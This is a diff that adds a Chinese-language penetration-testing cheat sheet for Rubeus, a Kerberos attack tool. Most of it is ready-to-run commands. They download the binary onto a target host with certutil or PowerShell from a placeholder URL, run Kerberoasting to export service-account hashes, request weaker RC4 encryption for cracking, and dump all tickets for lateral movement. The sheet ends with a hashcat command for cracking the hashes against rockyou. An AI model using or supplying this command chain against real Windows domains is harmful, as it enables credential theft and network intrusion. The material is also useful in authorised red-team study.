@@ -1,0 +1,39 @@
+项目地址：https://github.com/GhostPack/Rubeus
+>kali没安装Rubeus的话可以先安装
+sudo apt install rubeus
+>将Rubeus.exe拷贝到工具目录
+cp /usr/share/windows-resources/rubeus/Rubeus.exe $toolfile
+>下载Rubeus到目标机器（cmd）
+certutil -urlcache -split -f $downloadurl C:\windows\temp\$badfile
+>下载Rubeus到目标机器（powershell）
+powershell -c "iwr -uri $downloadurl -outfile C:\windows\temp\$badfile"
+>查看当前Kerberos票据（确认是否为域用户）
+C:\windows\temp\$badfile klist
+>执行Kerberoast（导出所有SPN的hash）
+C:\windows\temp\$badfile kerberoast
+>执行Kerberoast并保存到文件（推荐）
+C:\windows\temp\$badfile kerberoast /outfile:C:\windows\temp\hashes.txt
+>仅请求RC4（更易爆破，适合弱口令环境）
+C:\windows\temp\$badfile kerberoast /rc4opsec
+>指定用户进行Kerberoast
+C:\windows\temp\$badfile kerberoast /user:svc_mssql
+>查看当前票据详细信息
+C:\windows\temp\$badfile triage
+>导出当前所有ticket（用于横向/票据利用）
+C:\windows\temp\$badfile dump
+
+###
+Rubeus是Kerberos攻击核心工具，支持：
+- Kerberoasting
+- Pass-the-ticket
+- Overpass-the-hash
+- Ticket导出/导入
+
+如果kerberoast失败：
+1. 确认当前是域用户（klist）
+2. 确认存在SPN账户（如svc_mssql）
+3. 尝试指定用户或使用/rc4opsec
+
+hash拿到后使用hashcat：
+hashcat -m 13100 hashes.txt rockyou.txt
+###
